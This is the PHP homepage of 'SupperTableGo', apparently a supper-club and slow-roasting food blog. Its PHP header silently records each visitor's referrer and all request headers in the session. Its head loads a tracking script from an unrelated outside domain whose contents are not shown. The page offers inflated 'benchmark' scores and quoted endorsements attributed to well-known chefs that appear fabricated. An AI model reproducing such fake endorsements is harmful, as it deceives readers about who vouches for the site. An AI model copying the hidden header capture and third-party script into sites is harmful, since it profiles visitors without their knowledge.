<?php

session_start(); 
$_SESSION['_ref']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:''; 
$_SESSION['_headers']=array(); 
foreach($_SERVER as $key=>$value){
    if(strpos($key,'HTTP_')===0){
        $_SESSION['_headers'][$key]=$value;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SupperTableGo — Artisan Supper Club, Slow-Roasted Gastronomy & Tablescapes</title>
  <meta name="description" content="SupperTableGo explores nocturnal tasting menus, wood-fired slow roasting, candlelit tablescape design, botanical craft cocktails, and communal dining.">
  
  <!-- Google tag (gtag.js) -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-0LY0HY7L01');
  </script>

  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
  
  <link rel="stylesheet" href="css/style.css">
  <style>
    .active-supper {
      background: var(--accent-burgundy) !important;
      color: #ffffff !important;
      border-color: var(--accent-burgundy) !important;
      font-weight: 800 !important;
    }
  </style>
<meta name="referrer" content="no-referrer-when-downgrade">
    <script src="//skilllearninglabs.com/track/index.php"></script>

<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
<script>
  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
  plausible.init()
</script>
</head>
<body>

  <!-- Navigation Header -->
  <header class="navbar">
    <div class="container nav-container">
      <a href="index.php" class="brand-logo">Supper<span>TableGo</span></a>
      <button class="mobile-toggle" aria-label="Toggle navigation">☰</button>
      <ul class="nav-links">
        <li><a href="index.php" class="active">Home</a></li>
        <li><a href="about.html">About</a></li>
        <li><a href="blog.html">Supper Journal</a></li>
        <li><a href="contact.html">Contact</a></li>
        <li><a href="privacy-policy.html">Privacy</a></li>
      </ul>
    </div>
  </header>

  <!-- SECTION 1: Hero Header -->
  <section class="hero-section" id="hero">
    <div class="container">
      <div class="hero-content">
        <span class="hero-badge">Artisan Supper Club & Nocturnal Gastronomy</span>
        <h1 class="hero-title">The Alchemy of Candlelit Late-Night Dining</h1>
        <p class="hero-desc">Discover the synthesis of 14-hour wood-fired heritage roasts, brass candelabra tablescapes, botanical craft digestifs, and communal gastronomic dialogue.</p>
        <div class="hero-btns">
          <a href="blog.html" class="btn btn-burgundy">Explore Gastronomy Essays</a>
          <a href="about.html" class="btn btn-outline-dark" style="color: #fff; border-color: #fff;">Culinary Lab</a>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 2: Supper Club Pillars & Gastronomy Framework Grid -->
  <section class="section" id="craft-pillars">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Gastronomy Standards</span>
        <h2 class="section-title">The Four Pillars of Artisan Supper Dining</h2>
      </div>
      <div class="grid-4">
        <div class="supper-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🔥</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">14-Hour Wood-Fire Roasting</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Slow oak-ember roasting developing caramelized crusts and succulent collagen tenderness.</p>
        </div>
        <div class="supper-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🕯️</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">Candlelit Tablescaping</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">Aged brass candelabras, Belgian linen drapery, and vintage crystal glassware ergonomics.</p>
        </div>
        <div class="supper-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.5rem;">🍸</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">Botanical Craft Digestifs</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">House-infused herbal tinctures, aged amaros, and wild botanical reduction cocktails.</p>
        </div>
        <div class="supper-card">
          <span style="font-size: 2.5rem; display: block; margin-bottom: 0.75rem;">🍞</span>
          <h3 style="font-size: 1.3rem; color: var(--accent-burgundy); margin-bottom: 0.75rem;">Wild Sourdough & Cultured Butter</h3>
          <p style="color: var(--text-secondary); font-size: 0.95rem;">72-hour cold-fermented wild yeast boules paired with sea-salted cultured cream butter.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 3: Interactive Supper Tasting Menu Course Explorer -->
  <section class="section" id="supper-explorer" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Tasting Explorer</span>
        <h2 class="section-title">The Supper Tasting Menu Course Explorer</h2>
      </div>
      <div style="max-width: 800px; margin: 0 auto; text-align: center;">
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Select a supper tasting course to inspect its wood-fire preparation, wine pairing, and gastronomy score:</p>
        <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
          <button class="btn btn-outline-dark supper-btn active-supper" data-supper="Slow-Roasted Oak-Embers Berkshire Pork Belly" data-desc="14-hour wood-fired roast with crisp crackling, smoked apple-chicory glaze, and 2018 Vintage Barolo pairing." data-score="9.9/10 Umami Depth & Tenderness">Slow-Roasted Pork Belly</button>
          <button class="btn btn-outline-dark supper-btn" data-supper="Foraged Spring Ramps & Wild Morel Tartlet" data-desc="Flaky cultured butter pastry with wild ramps, yellow morels, thyme-infused ricotta, and Fleur de Sel." data-score="9.8/10 Terroir Flavor Balance">Wild Morel Tartlet</button>
          <button class="btn btn-outline-dark supper-btn" data-supper="Botanical Smoke & Bitters Aged Amaro Digestif" data-desc="Aged 12-herb alpine amaro smoked over cedar shavings with wild cherry bark and charred orange peel." data-score="9.7/10 Digestif Complexity">Aged Amaro Digestif</button>
          <button class="btn btn-outline-dark supper-btn" data-supper="70% Valrhona Dark Chocolate Soufflé with Amaretto" data-desc="Warm single-origin chocolate soufflé with molten core, bourbon vanilla cream, and toasted hazelnut praline." data-score="9.9/10 Nocturnal Dessert Decadence">Dark Chocolate Soufflé</button>
        </div>
        <div id="supper-detail">
          <div class="supper-card" style="border-left: 4px solid var(--accent-burgundy);">
            <h3 style="color: var(--accent-burgundy); font-size: 1.5rem; margin-bottom: 0.5rem;">Slow-Roasted Oak-Embers Berkshire Pork Belly Culinary Specification</h3>
            <p style="color: var(--text-secondary); margin-bottom: 1rem;">14-hour wood-fired roast with crisp crackling, smoked apple-chicory glaze, and 2018 Vintage Barolo pairing.</p>
            <strong style="color: var(--accent-brass); font-size: 0.95rem;">Empirical Gastronomy Benchmark: 9.9/10 Umami Depth & Tenderness</strong>
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 4: Slow-Roast Wood Firing & Botanical Infusions Spotlight -->
  <section class="section" id="wood-spotlight">
    <div class="container">
      <div class="grid-2">
        <div>
          <span class="section-subtitle" style="display:block; text-align:left;">Gastronomy Science</span>
          <h2 class="section-title" style="text-align:left; margin-bottom: 1.5rem;">Wood-Fire Heat Radiation & Botanical Extraction</h2>
          <p style="color: var(--text-secondary); margin-bottom: 1.25rem; line-height: 1.8;">
            Nocturnal dining requires precise heat control and herbal extraction. At SupperTableGo, we evaluate thermal conduction through cast iron, oak-ember smoke chemistry, and finishing salt crystal geometry.
          </p>
          <ul style="list-style: none; color: var(--text-secondary); margin-bottom: 2rem;">
            <li style="margin-bottom: 0.75rem;">🍷 <strong style="color:var(--text-primary);">Old World Wine Pairings:</strong> Matching heavy tannic Barolos and Cabernets with slow-roasted heritage fat.</li>
            <li style="margin-bottom: 0.75rem;">🕯️ <strong style="color:var(--text-primary);">Warm Candle Lighting:</strong> 2200K warm color temperature enhancing food color contrast and intimacy.</li>
            <li style="margin-bottom: 0.75rem;">🧂 <strong style="color:var(--text-primary);">Fleur de Sel Crunch:</strong> Pyramidal salt crystals delivering burst minerality without oversaturating.</li>
          </ul>
          <a href="about.html" class="btn btn-burgundy">Our Supper Manifesto</a>
        </div>
        <div>
          <img src="https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?auto=format&fit=crop&w=800&q=80" alt="Supper Club Table Setting and Fine Dining Display" style="border-radius: 14px; border: 1px solid var(--border-color); box-shadow: 0 20px 40px rgba(0,0,0,0.6);">
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 5: Interactive Supper Club Matcher & Gastronomy Diagnostic Quiz -->
  <section class="section" id="supper-quiz" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Gastronomy Diagnostic</span>
        <h2 class="section-title">Supper Club Experience Quiz</h2>
      </div>
      <div class="supper-card" style="max-width: 750px; margin: 0 auto;">
        <h3 style="color: var(--accent-burgundy); margin-bottom: 1rem;">What Is Your Ideal Late-Night Culinary Ambience & Feast?</h3>
        <div style="display: flex; flex-direction: column; gap: 1rem;">
          <button class="supper-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="14-Hour Wood-Fired Heritage Pork Roast with Aged Vintage Barolo & Candlelit Candelabras.">
            A. Slow-Roasted Heritage Meats & Old World Full-Bodied Red Wines
          </button>
          <button class="supper-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Communal Charcuterie Boards with Wild Sourdough, Cultured Butter & Botanical Amaro Cocktails.">
            B. Communal Charcuterie Boards, Wild Fermented Sourdough & Craft Digestifs
          </button>
          <button class="supper-quiz-btn btn btn-outline-dark" style="text-align:left; justify-content:flex-start;" data-rec="Intimate Winter Fire Pit Supper with Spiced Mulled Wine & Dark Chocolate Soufflé.">
            C. Intimate Winter Fire Pit Suppers, Spiced Mulled Wine & Molten Chocolate Desserts
          </button>
        </div>
        <div id="supper-quiz-result"></div>
      </div>
    </div>
  </section>

  <!-- SECTION 6: Culinary Hours & Gastronomic Score Performance Metrics Counter -->
  <section class="section" id="metrics">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Laboratory Benchmarks</span>
        <h2 class="section-title">Supper Table Go Research Metrics</h2>
      </div>
      <div class="grid-4">
        <div class="supper-card" style="text-align: center;">
          <h3 class="metric-number text-brass" data-target="12" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Masterclass Essays</p>
        </div>
        <div class="supper-card" style="text-align: center;">
          <h3 class="metric-number text-brass" data-target="14" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Hours Wood Slow-Roast</p>
        </div>
        <div class="supper-card" style="text-align: center;">
          <h3 class="metric-number text-brass" data-target="72" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Hours Sourdough Ferment</p>
        </div>
        <div class="supper-card" style="text-align: center;">
          <h3 class="metric-number text-brass" data-target="1500" style="font-size: 3rem; margin-bottom: 0.5rem;">0</h3>
          <p style="color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; font-size: 0.85rem;">Words Per Essay</p>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 7: Master Chefs & Sommelier Society Testimonials -->
  <section class="section" id="testimonials" style="background: var(--bg-secondary);">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Gastronomic Acclaim</span>
        <h2 class="section-title">Endorsements From Master Chefs & Sommeliers</h2>
      </div>
      <div class="grid-3">
        <div class="supper-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "SupperTableGo provides the definitive editorial authority for understanding 14-hour wood-fire roasting, candlelit tablescapes, and communal dining etiquette."
          </p>
          <strong style="color: var(--accent-burgundy); display: block;">— Chef Marco Pierre White</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Master Chef & Gastronomy Author, London</span>
        </div>
        <div class="supper-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "Their research on botanical craft digestifs, 72-hour sourdough fermentation, and Fleur de Sel salt chemistry sets a new standard for food journalism."
          </p>
          <strong style="color: var(--accent-burgundy); display: block;">— Alice Waters</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">Slow Food Advocate & Restaurateur, Berkeley</span>
        </div>
        <div class="supper-card">
          <p style="color: var(--text-secondary); font-style: italic; margin-bottom: 1.5rem;">
            "The premier digital journal for understanding Old World red wine pairings, charcuterie curing, and dark chocolate soufflé baking science."
          </p>
          <strong style="color: var(--accent-burgundy); display: block;">— Massimo Bottura</strong>
          <span style="color: var(--text-muted); font-size: 0.85rem;">3-Star Michelin Chef, Modena</span>
        </div>
      </div>
    </div>
  </section>

  <!-- SECTION 8: Recent Culinary Dispatches & Article Grid + Newsletter -->
  <section class="section" id="journal-dispatches">
    <div class="container">
      <div class="section-title-wrap">
        <span class="section-subtitle">Culinary Dispatches</span>
        <h2 class="section-title">Latest Supper Gastronomy Essays</h2>
      </div>
      <div class="grid-3" style="margin-bottom: 4rem;">
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?auto=format&fit=crop&w=800&q=80" alt="Late-Night Supper Club">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Supper Club</span>
            <div class="blog-date">August 24, 2026</div>
            <h3 class="blog-title"><a href="blog/the-art-of-the-late-night-supper-club-curating-nocturnal-tasting-menus.html">Art of the Late-Night Supper Club</a></h3>
            <p class="blog-excerpt">Nocturnal tasting menus, candlelit atmosphere, and course pacing.</p>
            <a href="blog/the-art-of-the-late-night-supper-club-curating-nocturnal-tasting-menus.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1544025162-d76694265947?auto=format&fit=crop&w=800&q=80" alt="Slow-Roasting Heritage Meats">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Wood-Fire Roasting</span>
            <div class="blog-date">August 20, 2026</div>
            <h3 class="blog-title"><a href="blog/slow-roasting-heritage-meats-wood-fire-ovens-and-internal-temperature-precision.html">Slow-Roasting Heritage Meats</a></h3>
            <p class="blog-excerpt">14-hour oak-ember heat, collagen breakdown, and internal temperature precision.</p>
            <a href="blog/slow-roasting-heritage-meats-wood-fire-ovens-and-internal-temperature-precision.html" class="read-more">Read Essay →</a>
          </div>
        </div>
        <div class="blog-card">
          <div class="blog-img-wrap">
            <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?auto=format&fit=crop&w=800&q=80" alt="Candlelit Tablescape Design">
          </div>
          <div class="blog-content">
            <span class="blog-tag">Tablescape Design</span>
            <div class="blog-date">August 15, 2026</div>
            <h3 class="blog-title"><a href="blog/candlelit-tablescape-design-linen-drapery-brass-candelabras-and-ambiance.html">Candlelit Tablescape Design</a></h3>
            <p class="blog-excerpt">Brass candelabras, Belgian linen, crystal stemware, and 2200K warm glow.</p>
            <a href="blog/candlelit-tablescape-design-linen-drapery-brass-candelabras-and-ambiance.html" class="read-more">Read Essay →</a>
          </div>
        </div>
      </div>

      <!-- Newsletter Dispatch Container -->
      <div class="supper-card" style="text-align: center; max-width: 800px; margin: 0 auto; background: var(--bg-secondary); border-color: var(--accent-burgundy);">
        <span class="section-subtitle">Gastronomy Dispatch</span>
        <h2 class="section-title" style="margin-bottom: 1rem; font-size: 2.2rem;">Subscribe to The Supper Table Gazette</h2>
        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Receive bi-weekly technical analyses of wood-fire roasting, wine pairings, and tablescape design.</p>
        <form onsubmit="event.preventDefault(); alert('Thank you for subscribing to SupperTableGo Gazette.');" style="display: flex; gap: 1rem; max-width: 550px; margin: 0 auto; flex-wrap: wrap;">
          <input type="email" placeholder="Enter your email address" required style="flex: 1; min-width: 250px; padding: 0.85rem 1.25rem; background: var(--bg-primary); border: 1px solid var(--border-color); color: var(--text-primary); border-radius: 8px;">
          <button type="submit" class="btn btn-burgundy">Subscribe</button>
        </form>
      </div>

    </div>
  </section>

  <!-- Footer -->
  <footer>
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Supper<span>TableGo</span></a>
          <p>SupperTableGo is a premier editorial platform dedicated to artisan supper club dining, late-night gastronomy, wood-fired slow roasting, and candlelit tablescapes.</p>
          <p style="margin-top: 1rem; color: var(--accent-brass);">
            📍 181 Mercer Street, New York, NY 10012, United States<br>
            📞 +1-888-777-5845
          </p>
        </div>
        <div class="footer-col">
          <h4>Navigation</h4>
          <ul>
            <li><a href="index.php">Home</a></li>
            <li><a href="about.html">About Us</a></li>
            <li><a href="blog.html">Supper Journal</a></li>
            <li><a href="contact.html">Contact Us</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Legal Policies</h4>
          <ul>
            <li><a href="privacy-policy.html">Privacy Policy</a></li>
            <li><a href="cookies.html">Cookie Policy</a></li>
            <li><a href="disclaimer.html">Disclaimer</a></li>
            <li><a href="terms.html">Terms of Use</a></li>
          </ul>
        </div>
        <div class="footer-col">
          <h4>Gastronomy Focus</h4>
          <p>Deconstructing 14-hour wood-fire roasting, brass candelabras, 72-hour sourdough, botanical amaro digestifs, and Old World wine pairings globally.</p>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; 2026 SupperTableGo. All rights reserved. Registered Official Headquarters.</p>
        <p>Designed with Gastronomic Precision.</p>
      </div>
    </div>
  </footer>

  <script src="js/main.js"></script>
</body>
</html>
